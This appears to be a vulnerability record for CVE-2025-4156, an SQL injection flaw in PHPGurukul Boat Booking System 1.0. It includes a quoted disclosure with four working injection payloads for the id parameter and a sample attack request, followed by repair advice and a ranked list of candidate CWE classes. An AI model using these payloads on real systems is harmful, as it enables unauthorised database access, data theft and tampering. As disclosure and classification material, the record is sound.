# Vulnerability Information: CVE-2025-4156

## Vulnerability Description
A vulnerability has been found in PHPGurukul Boat Booking System 1.0 and classified as critical. This vulnerability affects unknown code of the file /admin/change-image.php. The manipulation of the argument ID leads to **sql injection**. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.

### Vulnerability Description Key Phrases
- **weakness:** **sql injection**
- **product:** PHPGurukul Boat Booking System
- **version:** 1
- **component:** /admin/change-image.php

## CVE Reference Links Content Summary
```
Vulnerability details and POC
Vulnerability location:
"id (GET)" parameter
Payload:
Parameter: id (GET)
Type: boolean-based blind
Title: AND boolean-based blind - WHERE or HAVING clause
Payload: id=1' AND 3830=3830 AND 'Eoks'='Eoks
Type: error-based
Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
Payload: id=1' OR (SELECT 5914 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(5914=5914,1))),0x7170786b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'AlRa'='AlRa
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: id=1' AND (SELECT 8059 FROM (SELECT(SLEEP(5)))ewgs) AND 'RWzM'='RWzM
Type: UNION query
Title: Generic UNION query (NULL) - 12 columns
Payload: id=1' UNION ALL SELECT NULL,NULL,CONCAT(0x71717a6271,0x4c7061576f614676484c626f5356747572464c48714a53794d6a48616a68774c4e6f737745674c44,0x7170786b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
Vulnerability Request Packet
POST /bbs/admin/change-image.php?id=1 HTTP/1.1
Host: 192.168.0.157
Content-Length: 106001
Cache-Control: max-age=0
Origin: http://192.168.0.157
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzegXDy1DC6FDnxYZ
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.0.157/bbs/admin/change-image.php?id=1
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=vco4stpcpvvrm2m3pi1v6vrbe4
Connection: keep-alive
------WebKitFormBoundaryzegXDy1DC6FDnxYZ
Content-Disposition: form-data; name="boatname"
Hand Boat
------WebKitFormBoundaryzegXDy1DC6FDnxYZ
Content-Disposition: form-data; name="image"; filename="haha.jpg"
Content-Type: image/jpeg
123
```
```
# PHPGurukul Boat Booking System Project V1.0 /admin/change-image.php SQL injectionÂ #8
*   Boat Booking System
## Vendor Homepage
*   <https://phpgurukul.com/boat-booking-system-using-php-and-mysql/>
*   /admin/change-image.php
*   V1.0
## Problem Type
*   SQL injection
## Root Cause
*   A SQL injection vulnerability was identified within the "/admin/change-image.php" file of the "Boat Booking System" project. The root cause lies in the fact that attackers can inject malicious code via the parameter "id (GET)". This input is then directly utilized in SQL queries without undergoing proper sanitization or validation processes. As a result, attackers are able to fabricate input values, manipulate SQL queries, and execute unauthorized operations.
## Impact
*   Exploiting this SQL injection vulnerability allows attackers to gain unauthorized access to the database, cause sensitive data leakage, tamper with data, gain complete control over the system, and even disrupt services. This poses a severe threat to both the security of the system and the continuity of business operations.
# DESCRIPTION
*   During the security assessment of "Boat Booking System", I detected a critical SQL injection vulnerability in the "/admin/change-image.php" file. This vulnerability is attributed to the insufficient validation of user input for the "id (GET)" parameter. This inadequacy enables attackers to inject malicious SQL queries. Consequently, attackers can access the database without proper authorization, modify or delete data, and obtain sensitive information. Immediate corrective actions are essential to safeguard system security and uphold data integrity.
# Suggested repair
1.  **Employ prepared statements and parameter binding:**
    Prepared statements serve as an effective safeguard against SQL injection as they segregate SQL code from user input data. When using prepared statements, user - entered values are treated as mere data and will not be misconstrued as SQL code.
2.  **Conduct input validation and filtering:**
    Rigorously validate and filter user input data to guarantee that it conforms to the expected format. This helps in blocking malicious input.
3.  **Minimize database user permissions:**
    Ensure that the account used to connect to the database has only the minimum required permissions. Avoid using accounts with elevated privileges (such as 'root' or 'admin') for day - to - day operations.
```

## Retriever Results

### Top Combined Results

| Rank | CWE ID | Name | Abstraction | Usage  | Retrievers | Individual Scores |
|------|--------|------|-------------|-------|------------|-------------------|
| 1 | 89 | Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') | Base | Allowed | alternate_terms | 1.000 |
| 2 | 79 | Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') | Base | Allowed | sparse | 0.409 |
| 3 | 434 | Unrestricted Upload of File with Dangerous Type | Base | Allowed | sparse | 0.348 |
| 4 | 117 | Improper Output Neutralization for Logs | Base | Allowed | sparse | 0.337 |
| 5 | 99 | Improper Control of Resource Identifiers ('Resource Injection') | Class | Allowed-with-Review | sparse | 0.325 |
| 6 | 1336 | Improper Neutralization of Special Elements Used in a Template Engine | Base | Allowed | sparse | 0.320 |
| 7 | 352 | Cross-Site Request Forgery (CSRF) | Compound | Allowed | sparse | 0.316 |
| 8 | 116 | Improper Encoding or Escaping of Output | Class | Allowed-with-Review | sparse | 0.311 |
| 9 | 96 | Improper Neutralization of Directives in Statically Saved Code ('Static Code Injection') | Base | Allowed | dense | 0.567 |
| 10 | 73 | External Control of File Name or Path | Base | Allowed | graph | 0.003 |

